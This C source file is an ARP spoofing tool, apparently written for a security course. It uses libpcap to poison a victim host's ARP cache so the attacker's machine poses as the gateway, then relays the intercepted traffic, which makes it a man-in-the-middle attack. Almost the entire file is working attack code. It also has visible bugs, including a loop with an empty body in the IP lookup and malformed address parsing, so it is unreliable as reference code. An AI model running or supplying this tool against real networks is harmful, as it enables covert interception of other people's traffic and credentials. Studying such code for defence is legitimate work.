#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <pcap/pcap.h>
#include <sys/socket.h>
#include <string.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <arpa/inet.h>

#define ETH_ADDR_LEN 6
#define IP_ADDR_LEN 4
#define ARP_LEN 42
#define ARP_HARD_TYPE_ETH 0x01
#define ETH_TYPE_IP 0x0800
#define ETH_TYPE_ARP 0x0806
#define ARP_REQUEST 0x01
#define ARP_REPLY 0x02
#define NOT_RECOVERED 0
#define RECOVERED 1
#define TO_GET 0
#define TO_INFECT 1

uint8_t broadcast_mac[ETH_ADDR_LEN] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

struct eth_hdr{
    uint8_t eth_dst[ETH_ADDR_LEN];
    uint8_t eth_src[ETH_ADDR_LEN];
    uint16_t eth_type;
};

struct arp_hdr{
    uint16_t hard_type;
    uint16_t proto_type;
    uint8_t hard_addr_len;
    uint8_t proto_addr_len;
    uint16_t opcode;
    uint8_t sender_hard_addr[ETH_ADDR_LEN];
    uint8_t sender_proto_addr[IP_ADDR_LEN];
    uint8_t target_hard_addr[ETH_ADDR_LEN];
    uint8_t target_proto_addr[IP_ADDR_LEN];
};

struct ip_hdr{
    uint8_t ip_version;
    uint8_t TOS;
    uint16_t ip_len;
    uint16_t ip_id;
    uint16_t ip_flag;
    uint8_t TTL;
    uint8_t ip_protocol;
    uint16_t ip_hdr_checksum;
    uint8_t src_ip_addr[IP_ADDR_LEN];
    uint8_t dst_ip_addr[IP_ADDR_LEN];
};

int get_my_mac(const char * dev, uint8_t * mac){
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    struct ifreq ifr;

    memset(&ifr, 0X00, sizeof(ifr));
    strncpy(ifr.ifr_name, dev, IFNAMSIZ-1);

    int fd=socket(AF_INET, SOCK_DGRAM, 0);

    if(ioctl(fd, SIOCGIFHWADDR, &ifr) < 0)
        perror("ioctl ");

    for(int i=0; i<ETH_ADDR_LEN; i++)
        mac[i] = (uint8_t *)ifr.ifr_hwaddr.sa_data[i];

    close(sock);

    return 0;
}

int get_my_ip(uint8_t * ip){
    char buf[100];
    FILE *fp;
    fp = popen("hostname -I", "r");
    if(fp == NULL)
        return -1;
    while(fgets(buf, sizeof(buf), fp))

    pclose(fp);
    sscanf(buf, "%c.%c.%c.%c", ip, ip+1, ip+2, ip+3);

    return 1;
}

int arp_request(pcap_t * handle, uint8_t * src_mac, uint8_t * dst_mac, uint8_t * sender_ip, uint8_t * target_ip, uint8_t * buf, int flag_request)
{
    struct eth_hdr * eth = (struct eth_hdr *)buf;
    struct arp_hdr * arp = (struct arp_hdr *)(eth+1);

    for(int i=0; i<ETH_ADDR_LEN; i++){
        eth->eth_dst[i] = dst_mac[i];
        eth->eth_src[i] = src_mac[i];
    }

    eth->eth_type = htons(ETH_TYPE_ARP);
    arp->hard_type = htons(ARP_HARD_TYPE_ETH);
    arp->proto_type = htons(ETH_TYPE_IP);
    arp->hard_addr_len = ETH_ADDR_LEN;
    arp->proto_addr_len = IP_ADDR_LEN;
    arp->opcode = htons(ARP_REQUEST);

    for(int i=0; i<ETH_ADDR_LEN; i++){
        arp->sender_hard_addr[i] = src_mac[i];
        (flag_request == TO_GET) ? (arp->target_hard_addr[i] = 0x00) : (arp->target_hard_addr[i] = dst_mac[i]);
    }

    for(int i=0; i<IP_ADDR_LEN; i++){
        arp->sender_proto_addr[i] = sender_ip[i];
        arp->target_proto_addr[i] = target_ip[i];
    }

    pcap_sendpacket(handle, buf, ARP_LEN);

    if(pcap_sendpacket(handle, buf, ARP_LEN) == -1){
        printf("ARP REQUEST FAIL");
        return -1;
    }

    return 1;
}


void arp_reply(pcap_t * handle, uint8_t * sender_mac, uint8_t * sender_ip, uint8_t * target_ip, uint16_t * packet_size, int * flag_recover){

    while(1){
        struct pcap_pkthdr * header;
        const uint8_t * packet;

        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) break;

        struct eth_hdr * eth = (struct eth_hdr *)packet;

        if(htons(eth->eth_type) == ETH_TYPE_ARP){
            struct arp_hdr *arp=(struct arp_hdr *)(eth+1);

            if(arp->opcode == htons(ARP_REPLY)){ // request로 보낸 packet에 대한 sender의 응답일 때
                if((arp->sender_proto_addr[0] == sender_ip[0]) && (arp->sender_proto_addr[1] == sender_ip[1]) && (arp->sender_proto_addr[2] == sender_ip[2]) && (arp->sender_proto_addr[3] == sender_ip[3])){
                    for(int i=0; i<ETH_ADDR_LEN; i++)
                        sender_mac[i] = arp->sender_hard_addr[i];
                    printf("Sender Mac Address: %X:%X:%X:%X:%X:%X\n", sender_mac[0], sender_mac[1], sender_mac[2], sender_mac[3], sender_mac[4], sender_mac[5]);
                    break;
                }
            }

            if(arp->opcode == htons(ARP_REQUEST)){ // sender가 arp table을 recover 하기 위한 packet일 때
                if((arp->target_hard_addr[0] == broadcast_mac[0]) && (arp->target_hard_addr[1] == broadcast_mac[1]) && (arp->target_hard_addr[2] == broadcast_mac[2]) && (arp->target_hard_addr[3] == broadcast_mac[3])){
                    *flag_recover = RECOVERED;
                    printf("Victim Recovered\n");
                    break;
                }
            }
        }

        if(htons(eth->eth_type) == ETH_TYPE_IP){ // 감염된 sender가 target에 보내는 packet일 때
            struct ip_hdr * ip = (struct ip_hdr *)(eth+1);

            if((ip->dst_ip_addr[0]==target_ip[0]) && (ip->dst_ip_addr[1]==target_ip[1]) && (ip->dst_ip_addr[2]==target_ip[2]) && (ip->dst_ip_addr[3]==target_ip[3])){
                *packet_size = htons(ip->ip_len);
                printf("Packet is Relaying\n");
                break;
            }
        }
    }
}

int arp_relay(pcap_t * handle, const uint8_t * packet, uint16_t *packet_size, uint8_t * my_mac, uint8_t * target_mac)
{
    struct eth_hdr * eth = (struct eth_hdr *)packet;

    for (int i=0; i<ETH_ADDR_LEN; i++){
        eth->eth_dst[i] = target_mac[i];
        eth->eth_src[i] = my_mac[i];
    }

    pcap_sendpacket(handle, packet, *packet_size);
    printf("sent relay packet\n");

    return 1;
}


void usage() {
  printf("syntax: arp_spoof <interface> <sender ip 1> <target ip 1>\n");
  printf("sample: arp_spoof wlan0 192.168.10.2 192.168.10.1\n");
}

int main(int argc, char * argv[]){
    if(argc != 4){
        usage();
        return -1;
    }

    uint8_t my_mac[ETH_ADDR_LEN];
    uint8_t my_ip[IP_ADDR_LEN];
    uint8_t sender_mac[ETH_ADDR_LEN];
    uint8_t target_mac[ETH_ADDR_LEN];
    uint8_t sender_ip[IP_ADDR_LEN];
    uint8_t target_ip[IP_ADDR_LEN];
    uint8_t buf[ARP_LEN];
    uint16_t packet_size = 0;
    int flag_recover = NOT_RECOVERED;
    int flag_request = TO_GET;

    const char * dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];

    pcap_t * handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);

    if (handle == NULL){
        fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
        return -1;
    }

    get_my_mac(dev, my_mac);
    get_my_ip(my_ip);

    inet_pton(AF_INET, argv[2], sender_ip); // argv[i*2]의 값을 sender_ip에 저장
	inet_pton(AF_INET, argv[3], target_ip); // argv[i*2+1]의 값을 target_ip에 저장
     
	arp_request(handle, my_mac, broadcast_mac, my_ip, target_ip, buf, flag_request); // target의 mac address를 가져오기 위해 braodcast로 target의 ip address를 포함한 request를 보냄
    arp_reply(handle, target_mac, target_ip, my_ip, &packet_size, &flag_recover); // target ip에 해당하는 곳에서 보낸 reply packet을 잡아 packet안에 target의 mac address 부분을 target_mac에 저장
    arp_request(handle, my_mac, broadcast_mac, my_ip, sender_ip, buf, flag_request); // victim의 mac address를 가져오기 위해 braodcast로 victim의 ip address를 포함한 request를 보냄
    arp_reply(handle, sender_mac, sender_ip, my_ip, &packet_size, &flag_recover); // victim ip에 해당하는 곳에서 보낸 reply packet을 잡아 packet안에 target의 mac address 부분을 sender_mac(victim의 mac address)에 저장

    flag_request = TO_INFECT;
       
	while(1){
        arp_request(handle, my_mac, sender_mac, target_ip, sender_ip, buf, flag_request);

        struct pcap_pkthdr * header;
        const uint8_t * packet;
        int res = pcap_next_ex(handle, &header, &packet);
        
		if (res == 0) continue;     
		if (res == -1 || res == -2) break;
        
		flag_recover = NOT_RECOVERED;
		
		while(1){
			arp_reply(handle, sender_mac, sender_ip, target_ip, &packet_size, &flag_recover);
			if(flag_recover)
				break;
			arp_relay(handle, packet, &packet_size, my_mac, target_mac);        
		}   
	}    
	pcap_close(handle);

    return 0;
}
